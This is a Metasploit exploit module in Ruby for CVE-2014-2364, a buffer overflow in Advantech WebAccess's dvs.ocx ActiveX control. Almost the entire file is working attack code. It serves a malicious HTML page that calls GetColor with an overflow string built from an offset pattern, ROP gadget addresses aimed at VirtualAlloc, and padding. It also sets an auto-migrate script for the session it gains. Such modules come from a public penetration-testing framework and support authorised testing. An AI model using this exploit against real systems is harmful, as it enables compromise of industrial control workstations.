##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess dvs.ocx GetColor Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in Advantec WebAccess. The
        vulnerability exists in the dvs.ocx ActiveX control, where a dangerous call to
        sprintf can be reached with user controlled data through the GetColor function.
        This module has been tested successfully on Windows 7 SP1 and IE 10.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-2364'],
          ['ZDI', '14-255'],
          ['URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-198-02']
        ],
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => 'migrate -f',
        },
      'BrowserRequirements' =>
        {
          :source   => /script|headers/i,
          :os_name  => Msf::OperatingSystems::WINDOWS,
          :ua_name  => /MSIE/i,
          :clsid    => "{5CE92A27-9F6A-11D2-9D3D-000001155641}",
          :method   => "GetColor"
        },
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500,
          'DisableNopes'    => true,
          'BadChars'        => "\x00\x0a\x0d"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 17 2014'))
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Requested: #{request.uri}")

    content = <<-EOS
<html>
<object classid='clsid:5CE92A27-9F6A-11D2-9D3D-000001155641' id='test' /></object>
<script language='javascript'>
test.GetColor("#{sploit}", 0);
</script>
</html>
    EOS

    print_status("Sending #{self.name}")
    send_response_html(cli, content)
  end

  def sploit
    xpl = Rex::Text.pattern_create(61) #offset

    #xpl << "BBBB" # EIP :-)
    xpl << [0x60014184].pack("V") # POP ECX # RETN
    xpl << "CCCCDDDD"
    #xpl << (0x01..0x09).to_a.pack("C*") # ESP
    #xpl << (0x0b..0x0c).to_a.pack("C*")
    #xpl << (0x0e..0xff).to_a.pack("C*")
    xpl << [0x60022653].pack("V") # (ecx => VirtualAlloc)
    xpl << [0x6001f1c8].pack("V") # push , or, push or mov ret (edx = 40!)
    xpl << "A" * 1000

    xpl.gsub("\"", "\\\"") # Escape double quote, to not break javascript string
  end

end
